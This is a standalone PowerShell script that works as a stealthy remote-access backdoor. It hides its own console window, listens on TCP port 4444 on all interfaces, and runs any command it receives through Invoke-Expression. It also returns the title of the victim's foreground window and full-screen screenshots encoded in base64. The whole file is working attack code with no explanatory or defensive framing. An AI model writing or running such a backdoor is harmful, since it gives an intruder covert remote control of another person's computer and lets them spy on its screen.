$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru

$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

$port = 4444
$l = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $port)
$l.Start()
Write-Host "Bind shell listening on 0.0.0.0:$port" -ForegroundColor Green

$c = $l.AcceptTcpClient()
$s = $c.GetStream()
$e = New-Object System.Text.UTF8Encoding

$msg = "`n[+] BIND SHELL ACTIVE`nPS " + $PWD.Path + "> "
$s.Write($e.GetBytes($msg), 0, $msg.Length)

while($true) {
    [byte[]]$b = New-Object byte[] 4096
    $i = $s.Read($b, 0, $b.Length)
    if ($i -le 0) { break }
    
    $in = $e.GetString($b, 0, $i).Trim()
    $out = ""

    if ($in -eq 'kill' -or $in -eq 'exit') { break }
    
    elseif ($in -eq 'screen') {
        $handle = $api::GetForegroundWindow()
        $sb = New-Object System.Text.StringBuilder 256
        $api::GetWindowText($handle, $sb, $sb.Capacity)
        $out = "[WINDOW] " + $sb.ToString() + "`n"
    }
    elseif ($in -eq 'screenshot') {
        try {
            Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
            $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bmp = New-Object Drawing.Bitmap $sc.Width, $sc.Height
            $g = [Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen($sc.Location, [Drawing.Point]::Empty, $sc.Size)
            $ms = New-Object IO.MemoryStream
            $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg, 50L)
            $out = [Convert]::ToBase64String($ms.ToArray()) + "`n"
            $g.Dispose(); $bmp.Dispose(); $ms.Close()
        } catch { $out = "Screenshot error`n" }
    }
    else {
        $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message }
    }
    
    $prompt = "`nPS " + (Get-Location).Path + "> "
    $resp = $e.GetBytes($out + $prompt)
    $s.Write($resp, 0, $resp.Length)
}

$c.Close(); $l.Stop(); exit
